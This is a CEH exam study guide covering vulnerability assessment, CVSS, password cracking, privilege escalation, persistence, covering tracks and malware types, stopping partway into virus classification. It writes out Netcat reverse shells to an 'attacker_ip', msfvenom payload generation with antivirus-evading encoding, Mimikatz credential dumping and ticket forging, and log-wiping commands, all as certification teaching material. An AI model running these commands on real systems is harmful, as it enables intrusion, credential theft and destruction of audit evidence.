# CEH Exam Preparation: Day 2 — System Hacking Phases and Attack Techniques (Domain 3)

> Solving exercises will teach you more than you can think. Most of our knowledge comes from doing — and while doing you must solve problems, search for clues, and try different things; in this way you will learn rapidly.

This is Day 2 of your 7-day CEH (Certified Ethical Hacker) preparation. Today's focus is **Domain 3: System Hacking Phases and Attack Techniques**, which accounts for approximately **15% of the exam**. This domain covers the core offensive methodology: how attackers discover vulnerabilities, crack passwords, escalate privileges, deploy malware, maintain persistent access, and cover their tracks. Every concept in this guide is tested on the exam — read it completely.

**Recommended schedule for today (5-7 hours):**
1. Block 1 (2-2.5 h): Read the Vulnerability Analysis and System Hacking sections. Take notes on every tool name and technique.
2. Block 2 (2-2.5 h): Read the Malware Threats section. Build flashcards for virus types and malware categories.
3. Block 3 (1-2 h): Work through the exam-style questions at the end of each section. Re-read any section where you got an answer wrong.

---

## Part 1: Vulnerability Analysis

### 1.1 What Is Vulnerability Assessment?

A vulnerability assessment is a systematic process of identifying, quantifying, and prioritizing security weaknesses in a system, network, or application. It differs from penetration testing in a critical way the exam tests:

| Aspect | Vulnerability Assessment | Penetration Testing |
|--------|------------------------|-------------------|
| **Goal** | Identify and catalog all known vulnerabilities | Exploit vulnerabilities to demonstrate real-world impact |
| **Approach** | Automated scanning + manual verification | Manual exploitation with automated assistance |
| **Depth** | Broad but shallow — find everything | Narrow but deep — prove specific risks |
| **Output** | Prioritized list of vulnerabilities with remediation advice | Proof-of-concept exploits, screenshots, evidence of access |
| **Risk to systems** | Low — non-invasive scans | Higher — actual exploitation may cause disruption |

### 1.2 Types of Vulnerability Assessments

The CEH exam expects you to distinguish between six types of vulnerability assessments. Each approaches the problem from a different angle.

**Active Assessment:**
The scanner sends probes, packets, and requests to the target system and analyzes the responses. This is the most common type. Example: Nessus sending an HTTP request to a web server to check if it runs a vulnerable version of Apache. Active assessments can be detected by intrusion detection systems because they generate network traffic.

**Passive Assessment:**
The assessor monitors network traffic without sending any packets to the target. This is stealthier but provides less detailed results. Example: sniffing network traffic to identify unencrypted protocols (HTTP instead of HTTPS, Telnet instead of SSH, FTP instead of SFTP). Passive assessment cannot determine exact software versions unless the software announces them in traffic headers.

**Internal Assessment:**
Conducted from inside the organization's network perimeter. The scanner sits on the same LAN as the targets. This reveals vulnerabilities that an insider or an attacker who has already breached the perimeter could exploit. Internal assessments typically find more vulnerabilities than external ones because internal systems are often less hardened.

**External Assessment:**
Conducted from outside the network perimeter, simulating an internet-based attacker. The scanner sits on the public internet and probes the organization's externally facing assets (web servers, mail servers, DNS servers, VPN gateways). Only vulnerabilities reachable from the internet are discovered.

**Host-Based Assessment:**
Focuses on individual hosts (servers, workstations, laptops). An agent is installed on the host, or the scanner authenticates to the host via SSH or WinRM, and examines the local configuration: installed software versions, missing patches, insecure file permissions, local firewall rules, running services. This provides the most detailed view of a single system.

**Network-Based Assessment:**
Focuses on the network infrastructure: routers, switches, firewalls, wireless access points, and the network services running on hosts. The scanner probes open ports, identifies services, and checks for network-level vulnerabilities (e.g., weak SNMP community strings, unpatched router firmware).

**Additional types the exam may reference:**

**Wireless Assessment:** Specifically targets wireless networks. Identifies rogue access points, weak encryption (WEP, open networks), misconfigured WPA2/WPA3, and evil twin attacks.

**Application Assessment:** Focuses on web applications, APIs, and software. Tests for OWASP Top 10 vulnerabilities (SQL injection, XSS, broken authentication). Tools include Burp Suite, OWASP ZAP, and Acunetix.

### 1.3 CVSS — Common Vulnerability Scoring System

CVSS is a standardized framework for rating the severity of vulnerabilities. The CEH exam tests your knowledge of the scoring ranges, the metric groups, and how to interpret a CVSS score.

**CVSS Score Ranges (v3.0/v3.1):**

| Score Range | Severity Rating | Example |
|-------------|----------------|---------|
| **0.0** | None | An informational finding with no security impact |
| **0.1 - 3.9** | Low | A vulnerability requiring local access and user interaction, with minimal impact |
| **4.0 - 6.9** | Medium | A network-exploitable vulnerability with limited impact, or requiring authentication |
| **7.0 - 8.9** | High | A remotely exploitable vulnerability with significant impact on confidentiality/integrity/availability |
| **9.0 - 10.0** | Critical | A remotely exploitable vulnerability with complete system compromise, no authentication required (e.g., EternalBlue, Log4Shell) |

> Exam trap: The exam may present a CVSS score and ask you to classify it. Memorize the boundaries: 0 = None, 0.1-3.9 = Low, 4.0-6.9 = Medium, 7.0-8.9 = High, 9.0-10.0 = Critical. A score of 7.0 is High, not Medium. A score of 9.0 is Critical, not High.

**CVSS Metric Groups:**

CVSS v3.1 uses three metric groups to calculate the score:

**1. Base Metrics (mandatory — always included):**
These capture the intrinsic characteristics of the vulnerability that do not change over time or across environments.

- **Attack Vector (AV):** How the attacker reaches the vulnerable component.
  - Network (N): Exploitable remotely over the network (most severe)
  - Adjacent (A): Requires the attacker to be on the same network segment (e.g., same Wi-Fi, same VLAN)
  - Local (L): Requires local access to the system (logged-in user, physical access)
  - Physical (P): Requires physical interaction with the device (e.g., plugging in a USB)

- **Attack Complexity (AC):** How complex the attack is to execute.
  - Low (L): No special conditions needed — the attack works reliably every time
  - High (H): The attack requires specific conditions or race conditions

- **Privileges Required (PR):** What level of access the attacker needs before exploiting.
  - None (N): No authentication needed
  - Low (L): Basic user-level access
  - High (H): Administrative-level access required

- **User Interaction (UI):** Does a user need to perform an action (click a link, open a file)?
  - None (N): No user interaction needed (e.g., a worm spreading automatically)
  - Required (R): A user must do something (e.g., click a phishing link, open a malicious document)

- **Scope (S):** Can the vulnerability affect components beyond its security scope?
  - Unchanged (U): The impact is limited to the vulnerable component
  - Changed (C): The vulnerability can affect other components (e.g., a VM escape affects the hypervisor)

- **Impact Metrics (CIA):** Each rated as None, Low, or High.
  - Confidentiality (C): Can the attacker read data they should not?
  - Integrity (I): Can the attacker modify data?
  - Availability (A): Can the attacker disrupt the service?

**2. Temporal Metrics (optional):**
These change over time as exploits are developed and patches are released.
- Exploit Code Maturity: Is there a working exploit? (Not Defined, Unproven, Proof-of-Concept, Functional, High)
- Remediation Level: Is a patch available? (Not Defined, Official Fix, Temporary Fix, Workaround, Unavailable)
- Report Confidence: How confident is the vulnerability report? (Not Defined, Unknown, Reasonable, Confirmed)

**3. Environmental Metrics (optional):**
These allow an organization to customize the score based on the specific environment where the vulnerability exists.
- Modified base metrics: Adjust base scores for local relevance
- Security requirements (CIA): How important is confidentiality/integrity/availability for this specific system? (Low, Medium, High)

**CVSS Vector String example:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```
This represents the worst possible score (10.0): remotely exploitable over the network (AV:N), low complexity (AC:L), no privileges required (PR:N), no user interaction (UI:N), scope changed (S:C), and complete impact on confidentiality, integrity, and availability (C:H/I:H/A:H).

### 1.4 Vulnerability Assessment Tools

**Nessus (Tenable):**
- The most widely used commercial vulnerability scanner
- Provides extensive plugin library (over 180,000 plugins)
- Scans for vulnerabilities, misconfigurations, compliance violations
- Uses a client-server architecture: the Nessus server runs the scans, the web interface provides management
- Outputs results in multiple formats (HTML, CSV, Nessus XML)
- Supports credentialed scanning (authenticates to hosts for deeper analysis) and non-credentialed scanning
- Nessus Essentials: free version limited to 16 IP addresses (formerly Nessus Home)
- Nessus Professional: commercial version for unlimited IPs

**OpenVAS (Open Vulnerability Assessment Scanner):**
- Open-source alternative to Nessus
- Part of the Greenbone Vulnerability Management (GVM) framework
- Uses NVTs (Network Vulnerability Tests) — its vulnerability database
- Runs on Linux; web-based management interface (Greenbone Security Assistant / GSA)
- Supports authenticated and unauthenticated scans
- Community feed (free) vs. Greenbone Enterprise feed (commercial)

**Qualys:**
- Cloud-based vulnerability management platform
- No local scanner installation required (uses cloud agents or appliances)
- Provides continuous monitoring and asset discovery
- Integrates vulnerability data with compliance frameworks (PCI DSS, HIPAA)
- QualysGuard is the primary product name

**Other tools the exam may reference:**
- **Nikto:** Open-source web server scanner (checks for dangerous files, outdated software, misconfigurations)
- **GFI LanGuard:** Network auditing and patch management
- **Rapid7 Nexpose/InsightVM:** Enterprise vulnerability management

### 1.5 Vulnerability Assessment Lifecycle

The exam expects you to know the phases of a vulnerability assessment:

1. **Pre-assessment:** Define scope, get authorization, identify target systems, select tools
2. **Assessment:** Run scans, collect data, identify vulnerabilities
3. **Post-assessment:** Analyze results, eliminate false positives, prioritize findings, generate reports, recommend remediations
4. **Remediation:** Apply patches, harden configurations, re-scan to verify fixes
5. **Ongoing monitoring:** Schedule recurring scans, update vulnerability signatures

---

## Part 2: System Hacking

System hacking is the core of the CEH exam. The CEH methodology defines a clear sequence of four phases:

```
1. Gaining Access  -->  2. Escalating Privileges  -->  3. Maintaining Access  -->  4. Clearing Tracks
```

Each phase has specific techniques, tools, and countermeasures. The exam tests all of them.

### 2.1 Phase 1: Gaining Access — Password Cracking

Password cracking is the primary technique for gaining initial access. The exam categorizes cracking methods into several types.

#### 2.1.1 Password Attack Categories

**Non-Electronic Attacks (no technology needed):**
- Shoulder surfing: watching someone type their password
- Dumpster diving: searching trash for written passwords
- Social engineering: manipulating people into revealing passwords

**Active Online Attacks (interact with the live authentication system):**
- Dictionary attack: try every word from a wordlist
- Brute force: try every possible character combination
- Rule-based attack: apply transformation rules to dictionary words
- Password spraying: try one common password against many accounts
- Credential stuffing: use stolen username/password pairs from breaches
- Trojan/keylogger: capture passwords as users type them

**Passive Online Attacks (capture authentication data without interacting with the target):**
- Packet sniffing: capture plaintext credentials from the network (HTTP, FTP, Telnet)
- Man-in-the-Middle (MITM): intercept authentication traffic between client and server
- Replay attack: capture and re-send a valid authentication token

**Offline Attacks (work with captured password hashes, no network access needed):**
- Dictionary attack against hashes
- Brute force against hashes
- Rainbow table attack
- Distributed network attack (DNA)

#### 2.1.2 Password Cracking Techniques — Deep Dive

**Dictionary Attack:**
Uses a pre-compiled wordlist (dictionary) of common passwords and words. Each word is hashed using the same algorithm as the target, and the hash is compared to the captured hash.
- Fast but limited to words in the dictionary
- Common wordlists: `rockyou.txt` (14 million passwords), `darkweb2017.txt`, SecLists
- Effective against weak passwords ("password123", "letmein", "qwerty")

```bash
# John the Ripper dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat dictionary attack (mode 0 = straight/dictionary)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Brute Force Attack:**
Tries every possible combination of characters up to a specified length. Guaranteed to find the password eventually, but extremely slow for long passwords.
- A 6-character lowercase password: 26^6 = 308 million combinations
- An 8-character mixed-case + digits password: 62^8 = 218 trillion combinations
- An 8-character full-charset password (lowercase + uppercase + digits + symbols): 95^8 = 6.6 quadrillion combinations

```bash
# John the Ripper brute force (incremental mode)
john --incremental hashes.txt

# Hashcat brute force (mode 3 = brute force / mask attack)
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
```

**Hybrid Attack:**
Combines a dictionary attack with brute force. Takes dictionary words and appends or prepends characters. For example, "password" becomes "password1", "password123", "Password!", "1password".

```bash
# Hashcat hybrid attack (mode 6 = wordlist + mask)
hashcat -m 0 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d

# Hashcat hybrid attack (mode 7 = mask + wordlist)
hashcat -m 0 -a 7 hashes.txt ?d?d?d /usr/share/wordlists/rockyou.txt
```

**Rainbow Table Attack:**
A rainbow table is a precomputed lookup table mapping hashes to plaintext passwords. Instead of computing hashes on the fly (like dictionary/brute force), the attacker simply looks up the captured hash in the table.

- **Advantage:** Extremely fast lookup — near-instant password recovery
- **Disadvantage:** Tables are massive (hundreds of GB to TB) and must be generated for each hash algorithm and character set separately
- **Defeated by:** Password salting (see below)
- **Tool:** `RainbowCrack` (rtgen to generate tables, rcrack to crack)
- **Online rainbow tables:** CrackStation, Hashes.org

**Rule-Based Attack:**
Uses rules to transform dictionary words based on common password creation patterns. Rules define transformations like capitalize first letter, reverse the word, substitute letters with numbers (leet speak), add year at the end.

```bash
# Hashcat rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Common rules:
# l     = convert to lowercase
# u     = convert to uppercase
# c     = capitalize first letter, lowercase rest
# $1    = append "1"
# ^!    = prepend "!"
# sa@   = substitute 'a' with '@'
# se3   = substitute 'e' with '3'
```

#### 2.1.3 Password Salting

**What is a salt?**
A salt is a random string of characters that is appended or prepended to the password before hashing. Each user gets a unique salt, which is stored alongside the hash in the password database.

**Why salting defeats rainbow tables:**
Without salt: `hash("password") = 5f4dcc3b5aa765d61d8327deb882cf99` — this hash is the same for every user who uses "password". A rainbow table can look it up instantly.

With salt: `hash("password" + "x7k2p9") = a completely different hash` — even if two users have the same password, their salts are different, so their hashes are different. An attacker would need a separate rainbow table for every possible salt value, which is computationally infeasible.

```
Without salting:
  User1: password  -->  MD5  -->  5f4dcc3b...  (same hash)
  User2: password  -->  MD5  -->  5f4dcc3b...  (same hash)
  Attacker: looks up 5f4dcc3b... in rainbow table --> "password"

With salting:
  User1: password + salt "a3f8"  -->  MD5  -->  9c2d1e7f...
  User2: password + salt "k7m2"  -->  MD5  -->  4b8e3a1c...
  Attacker: cannot use precomputed tables; must brute-force each hash separately
```

**Where salting is used:**
- Linux: `/etc/shadow` uses salted hashes (SHA-512 by default: `$6$salt$hash`)
- Modern web applications: bcrypt, scrypt, Argon2 all include built-in salting
- **Not used:** NTLM hashes in Windows are **unsalted** — this is why Windows password hashes are particularly vulnerable to rainbow table attacks and pass-the-hash attacks

#### 2.1.4 Windows Password Storage

The exam heavily tests Windows password storage mechanisms:

**SAM (Security Accounts Manager) database:**
- Located at `C:\Windows\System32\config\SAM`
- Stores local user account password hashes
- Locked by the operating system while Windows is running (cannot be copied while the OS is booted)
- Can be extracted by booting from a live USB/CD, or by extracting from the registry using tools like `reg save`

**NTLM Hash:**
- The hash format used by modern Windows systems
- MD4-based, unsalted (every instance of "password" produces the same NTLM hash)
- Format: `username:RID:LM_hash:NTLM_hash:::`
- LM hashes are disabled by default since Windows Vista/Server 2008

**LM (LAN Manager) Hash — Legacy:**
- Extremely weak hash format used by older Windows systems (pre-Vista)
- Weaknesses that make it trivially crackable:
  1. Password is converted to uppercase (reduces keyspace dramatically)
  2. Password is padded or truncated to exactly 14 characters
  3. Split into two 7-character halves, each hashed independently (effectively two 7-character passwords)
  4. No salt
- If the LM hash ends with `AAD3B435B51404EE`, the password is 7 characters or fewer (the second half is empty)

**Active Directory (NTDS.dit):**
- Domain controller password database
- Located at `C:\Windows\NTDS\NTDS.dit`
- Contains NTLM hashes for all domain users
- Can be extracted using `ntdsutil`, `vssadmin` (volume shadow copy), or Mimikatz's `lsadump::dcsync`

#### 2.1.5 Linux Password Storage

**`/etc/passwd`:**
- Readable by all users
- Originally stored password hashes (field 2), now contains `x` indicating the hash is in `/etc/shadow`
- Format: `username:x:UID:GID:comment:home_dir:shell`

**`/etc/shadow`:**
- Readable only by root
- Stores the actual password hashes
- Format: `username:$id$salt$hash:last_changed:min:max:warn:inactive:expire:`
- Hash algorithm identifiers:
  - `$1$` = MD5 (insecure, do not use)
  - `$2a$` or `$2b$` = Blowfish/bcrypt
  - `$5$` = SHA-256
  - `$6$` = SHA-512 (current default on most Linux distributions)
  - `$y$` = yescrypt (newest, used by Debian 11+, Ubuntu 22.04+)

### 2.2 Key Password Cracking Tools

**John the Ripper:**
- Open-source, cross-platform password cracker
- Supports 200+ hash types (NTLM, SHA-512, bcrypt, MD5, Kerberos, etc.)
- Three attack modes: Single (username-based guessing), Wordlist (dictionary), Incremental (brute force)
- `john --format=NT hashes.txt` — crack NTLM hashes
- `john --show hashes.txt` — display cracked passwords
- `unshadow /etc/passwd /etc/shadow > combined.txt` — combine Linux password files for cracking

**Hashcat:**
- World's fastest password cracker (leverages GPU acceleration)
- Supports 350+ hash types
- Attack modes: 0 = Dictionary, 1 = Combinator, 3 = Brute Force/Mask, 6/7 = Hybrid
- Common hash type codes: `-m 0` (MD5), `-m 1000` (NTLM), `-m 1800` (SHA-512 Unix), `-m 3200` (bcrypt)

```bash
# Crack NTLM hashes with a dictionary
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# Crack NTLM hashes with brute force (8-character, all character types)
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a?a?a

# Show cracked passwords
hashcat -m 1000 --show ntlm_hashes.txt
```

**L0phtCrack:**
- Windows-specific password auditing tool
- Can import hashes from local SAM, Active Directory, or network sniffing
- Supports dictionary, hybrid, brute force, and precomputed hash attacks
- Provides password quality assessment reports for auditors
- Originally developed by L0pht Heavy Industries (now @stake)

**Mimikatz:**
- Post-exploitation tool for extracting credentials from Windows memory
- This is one of the most important tools on the CEH exam

```
# Dump plaintext passwords from LSASS memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Extract NTLM hashes
mimikatz # sekurlsa::msv

# Pass-the-Hash attack
mimikatz # sekurlsa::pth /user:Administrator /ntlm:HASH /domain:target.local

# DCSync attack (extract hashes from domain controller remotely)
mimikatz # lsadump::dcsync /domain:target.local /user:Administrator

# Dump SAM database
mimikatz # lsadump::sam

# Golden ticket attack (forge a Kerberos TGT)
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-... /krbtgt:HASH
```

> Exam trap: Mimikatz's `sekurlsa::logonpasswords` can extract plaintext passwords from LSASS (Local Security Authority Subsystem Service) memory on Windows systems. This works because Windows caches credentials in memory for SSO purposes. Starting with Windows 10 and Server 2016, Microsoft introduced Credential Guard (using virtualization-based security) to protect LSASS memory. The exam may ask what countermeasure prevents Mimikatz from extracting plaintext passwords — the answer is Credential Guard.

### 2.3 Phase 2: Escalating Privileges

Once an attacker gains initial access (typically as a low-privilege user), the next goal is to escalate to administrator or root.

#### 2.3.1 Vertical Privilege Escalation

Moving from a lower privilege level to a higher one. A regular user becomes an administrator or SYSTEM/root.

**Techniques:**
- **Exploiting vulnerabilities:** Use a local privilege escalation exploit (kernel exploit, service exploit) to gain SYSTEM/root
- **Misconfigured services:** A Windows service running as SYSTEM with weak file permissions — the attacker replaces the service binary with a malicious one
- **Unquoted service paths:** If a Windows service path contains spaces and is not quoted, Windows tries to execute intermediate paths first. Example: `C:\Program Files\My App\service.exe` — Windows tries `C:\Program.exe`, then `C:\Program Files\My.exe`, then the correct path. If the attacker can write to `C:\Program.exe`, they get SYSTEM execution.
- **DLL hijacking:** Place a malicious DLL in a location that a privileged application searches before the legitimate DLL location
- **Token manipulation:** Steal or duplicate an access token from a higher-privilege process
- **Named pipe impersonation:** Create a named pipe and trick a privileged service into connecting to it
- **Credential harvesting:** Find stored credentials (config files, scripts, registry, browser saved passwords)

**Metasploit `getsystem` command:**
After getting a Meterpreter shell, the `getsystem` command automatically attempts multiple privilege escalation techniques:

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

# getsystem uses these techniques (in order):
# 1. Named Pipe Impersonation (In Memory/Admin)
# 2. Named Pipe Impersonation (Dropper/Admin)
# 3. Token Duplication (In Memory/Admin)
# 4. Named Pipe Impersonation (RPCSS variant)
```

#### 2.3.2 Horizontal Privilege Escalation

Moving to another account at the **same** privilege level. The attacker does not gain higher privileges but gains access to different data or systems.

**Example:** An attacker compromises User A's account and then uses that access to read User B's files or impersonate User B. Both are regular users, but the attacker now has access to User B's data.

**Techniques:**
- Session hijacking: steal another user's session cookie or token
- Pass-the-hash: use another user's NTLM hash to authenticate as them
- Access token theft: duplicate another user's Windows access token

> Exam trap: The exam frequently tests whether you can distinguish vertical from horizontal privilege escalation. Vertical = going UP (user to admin). Horizontal = going SIDEWAYS (user to different user at the same level). If a question says "User A gains access to User B's account, both are regular users," that is horizontal. If it says "User A (regular user) gains Administrator access," that is vertical.

### 2.4 Phase 3: Maintaining Access

After gaining access and escalating privileges, the attacker wants to maintain persistent access so they can return even after a reboot, password change, or patching of the original vulnerability.

#### 2.4.1 Backdoors

A backdoor is any mechanism that allows the attacker to regain access to the system without going through normal authentication.

**Types of backdoors:**
- Reverse shells (the compromised system connects back to the attacker)
- Web shells (a script placed on a web server that provides command execution)
- Scheduled tasks / cron jobs that run a malicious payload
- New user accounts created by the attacker
- Modified SSH authorized_keys file
- Registry run keys (Windows — auto-start on login)

**Netcat — "The Swiss Army Knife of Networking":**

```bash
# Listener (attacker's machine) — waiting for connection
nc -lvp 4444

# Reverse shell (victim's machine) — connects back to attacker
nc -e /bin/bash attacker_ip 4444          # Linux
nc -e cmd.exe attacker_ip 4444            # Windows

# Bind shell (victim's machine) — listens for attacker's connection
nc -lvp 4444 -e /bin/bash                 # Linux
nc -lvp 4444 -e cmd.exe                   # Windows

# File transfer
nc -lvp 4444 > received_file              # Receiver
nc target_ip 4444 < file_to_send          # Sender
```

**Cryptcat:**
An encrypted version of Netcat that uses Twofish encryption. Identical syntax to Netcat but all traffic is encrypted, making it harder for IDS/IPS to detect.

```bash
# Encrypted listener
cryptcat -lvp 4444 -k secretpassword

# Encrypted reverse shell
cryptcat -e /bin/bash attacker_ip 4444 -k secretpassword
```

**Metasploit (msfvenom) — Payload Generation:**

```bash
# Generate a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe

# Generate a Linux reverse shell ELF binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf

# Generate a PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php

# Generate a Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.py

# Encode the payload to evade antivirus (shikata_ga_nai encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_shell.exe
```

**Metasploit Handler (receiving the reverse connection):**
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST attacker_ip
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

#### 2.4.2 Rootkits

A rootkit is malware designed to provide continued privileged access while hiding its presence from users and security software. The name comes from "root" (Unix superuser) + "kit" (software tools).

**Rootkit Levels (from least to most dangerous):**

| Level | Name | How It Works | Detection Difficulty |
|-------|------|-------------|---------------------|
| **User-level (application level)** | Replaces or modifies standard system binaries (ls, ps, netstat, passwd) with trojanized versions that hide the attacker's presence | Moderate — integrity checking (Tripwire, AIDE) can detect modified binaries |
| **Kernel-level** | Modifies the operating system kernel by loading a malicious kernel module (LKM) or patching kernel memory. Intercepts system calls to hide processes, files, and network connections | Very difficult — operates at the highest OS privilege level; cannot be detected by user-space tools |
| **Hypervisor-level (virtual machine based)** | Installs itself as a thin hypervisor below the operating system, pushing the original OS into a virtual machine. The rootkit controls the hardware directly and the OS cannot detect it because it runs "above" the rootkit | Extremely difficult — the OS thinks it is running on real hardware; examples include Blue Pill (proof-of-concept) and SubVirt |
| **Bootloader-level (bootkit)** | Replaces the legitimate bootloader (MBR or VBR) with a malicious one that loads before the OS. Controls the boot process. | Very difficult — loads before the OS and before anti-malware; UEFI Secure Boot is the primary countermeasure |
| **Firmware-level** | Hides in device firmware (BIOS/UEFI, network card firmware, hard drive firmware). Survives OS reinstallation and even disk replacement in some cases. | Near impossible — persists across OS reinstalls; requires firmware reflashing or hardware replacement |

> Exam trap: The exam may ask "Which type of rootkit is the hardest to detect?" Answer: hypervisor-level or firmware-level. It may ask "Which rootkit type modifies the OS kernel?" Answer: kernel-level rootkit. User-level rootkits replace user-space binaries and are the easiest to detect (with file integrity monitoring).

**Rootkit Detection Techniques:**
- **Integrity checking:** Compare system file hashes against known-good baselines (Tripwire, AIDE, OSSEC)
- **Cross-view detection:** Compare results from different methods (e.g., compare files listed by the OS with files found by raw disk analysis — discrepancies indicate hidden files)
- **Behavior-based detection:** Monitor for suspicious kernel modifications, unexpected system call hooks
- **Boot from clean media:** Boot from a trusted live CD/USB and scan the dormant OS
- **UEFI Secure Boot:** Prevents unsigned bootloaders from loading (countermeasure against bootkits)

### 2.5 Phase 4: Clearing Tracks

The final phase is evidence destruction — removing all traces of the intrusion so administrators and forensic investigators cannot determine what happened.

#### 2.5.1 Log Manipulation

**Windows Event Logs:**
Windows stores logs in `.evtx` files under `C:\Windows\System32\winevt\Logs\`. The three primary logs:

| Log | What It Records |
|-----|----------------|
| **Security** | Authentication events (login success/failure), privilege use, policy changes |
| **System** | OS events (service start/stop, driver load/unload, system errors) |
| **Application** | Application-specific events (software errors, updates, crashes) |

**Clearing Windows logs:**
```cmd
:: Clear all event logs (requires Administrator)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

:: Clear all logs at once using PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

:: Using Metasploit Meterpreter
meterpreter > clearev
[*] Wiping 4628 records from Security...
[*] Wiping 1547 records from System...
[*] Wiping 312 records from Application...
```

> Exam trap: Clearing event logs itself generates a log entry (Event ID 1102 in the Security log: "The audit log was cleared"). A sophisticated attacker would selectively delete specific entries rather than clearing the entire log. The exam may test this — complete log deletion is a red flag that is easily noticed.

**Linux Log Files:**

| Log File | What It Records |
|----------|----------------|
| `/var/log/auth.log` or `/var/log/secure` | Authentication events (SSH logins, sudo usage, su commands) |
| `/var/log/syslog` or `/var/log/messages` | General system activity |
| `/var/log/wtmp` | Login/logout records (binary file, read with `last`) |
| `/var/log/btmp` | Failed login attempts (binary file, read with `lastb`) |
| `/var/log/lastlog` | Most recent login for each user (read with `lastlog`) |
| `/var/log/apache2/access.log` | Apache web server access log |

**Clearing Linux logs and history:**
```bash
# Clear bash history for current session
history -c

# Delete bash history file
rm ~/.bash_history

# Prevent bash from saving history (set history size to 0)
export HISTSIZE=0
export HISTFILESIZE=0

# Alternatively, redirect history file to /dev/null
ln -sf /dev/null ~/.bash_history

# Clear specific log entries (e.g., remove lines containing attacker's IP)
sed -i '/192.168.1.100/d' /var/log/auth.log

# Truncate a log file (empties it but keeps the file)
> /var/log/auth.log
# or
truncate -s 0 /var/log/auth.log

# Clear binary login records
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog

# Disable bash history for the current session
unset HISTFILE
set +o history
```

#### 2.5.2 Hiding Files

**Alternate Data Streams (ADS) — Windows NTFS:**
NTFS supports multiple data streams per file. Every file has a default (unnamed) stream containing the file's data. ADS allows additional named streams to be attached to a file without changing its size, timestamps, or visible attributes.

Attackers use ADS to hide malicious executables, scripts, or data behind innocent-looking files.

```cmd
:: Create an ADS — hide malicious.exe behind notes.txt
type malicious.exe > notes.txt:hidden.exe

:: The file "notes.txt" still looks normal; dir shows original size
dir notes.txt
:: Output: notes.txt    42 bytes (the ADS is invisible)

:: Execute the hidden file (Windows 7 and earlier)
start notes.txt:hidden.exe

:: Execute hidden file using wmic (Windows 10+)
wmic process call create "notes.txt:hidden.exe"

:: List all ADS on a file
dir /r notes.txt
:: Output: notes.txt:hidden.exe:$DATA

:: List ADS using PowerShell
Get-Item notes.txt -Stream *

:: Remove an ADS
Remove-Item notes.txt -Stream hidden

:: List ADS in a directory using streams.exe (Sysinternals)
streams.exe -s C:\Users\
```

> Exam trap: ADS is specific to NTFS. It does not work on FAT32, exFAT, or other file systems. If a file with ADS is copied to a non-NTFS volume (USB drive with FAT32, email attachment, network share with non-NTFS storage), the ADS is silently stripped. The exam may ask "What happens to ADS when a file is copied to a FAT32 drive?" Answer: The ADS is lost.

**Hidden Files on Linux:**
On Linux, any file or directory whose name starts with a dot (`.`) is hidden from normal directory listings.

```bash
# Create a hidden directory
mkdir .secret_tools

# Create a hidden file
touch .malicious_script.sh

# Normal ls does not show hidden files
ls
# (nothing visible)

# ls -a or ls -la shows hidden files
ls -la
# drwxr-xr-x  .secret_tools
# -rw-r--r--  .malicious_script.sh
```

**Steganography:**
Hiding data inside innocent-looking files (images, audio, video). The exam references several steganography tools:
- **OpenStego:** Open-source, hides data in images
- **Snow:** Hides data in whitespace at the end of text lines
- **Steghide:** Hides data in JPEG, BMP, WAV, and AU files
- **Covert_tcp:** Hides data in TCP/IP packet headers (using the IP identification field, TCP sequence number, or TCP acknowledgment number)

```bash
# Steghide: embed a secret file in an image
steghide embed -cf cover_image.jpg -ef secret.txt -p password

# Steghide: extract the hidden file
steghide extract -sf cover_image.jpg -p password
```

---

## Part 3: Malware Threats

### 3.1 Malware Categories

The CEH exam requires you to know the distinguishing characteristics of each malware type. The key differentiators are: does it replicate? does it need a host file? does it spread autonomously?

| Malware Type | Self-Replicates? | Needs Host File? | Spreads Autonomously? | Key Characteristic |
|-------------|-----------------|-----------------|----------------------|-------------------|
| **Virus** | Yes | Yes — attaches to executable files | No — requires user action (run the infected file) | Parasitic: infects other files |
| **Worm** | Yes | No — standalone executable | Yes — spreads over the network without user action | Self-propagating: exploits network vulnerabilities |
| **Trojan** | No | No — disguises as legitimate software | No — user must install it | Deception: appears useful but contains hidden malicious functionality |
| **Ransomware** | No (usually) | No | Varies (WannaCry used worm-like spreading) | Encrypts files and demands payment for decryption key |
| **Spyware** | No | No | No | Silently collects user data (keystrokes, browsing, screenshots) |
| **Adware** | No | No | No | Displays unwanted advertisements, often bundled with free software |
| **Fileless Malware** | No | No files on disk | Varies | Lives entirely in memory; uses legitimate system tools (PowerShell, WMI, macros) |
| **APT (Advanced Persistent Threat)** | N/A — this is a campaign, not a single malware | Multiple tools used | Yes — often includes worms, backdoors, custom tools | State-sponsored or organized crime; long-term, targeted, stealthy |

### 3.2 Virus Types — Complete Classification

The exam tests your ability to identify virus types based on their evasion and infection techniques. This is one of the most heavily tested topics.

**By Evasion Technique:**

**Polymorphic Virus:**
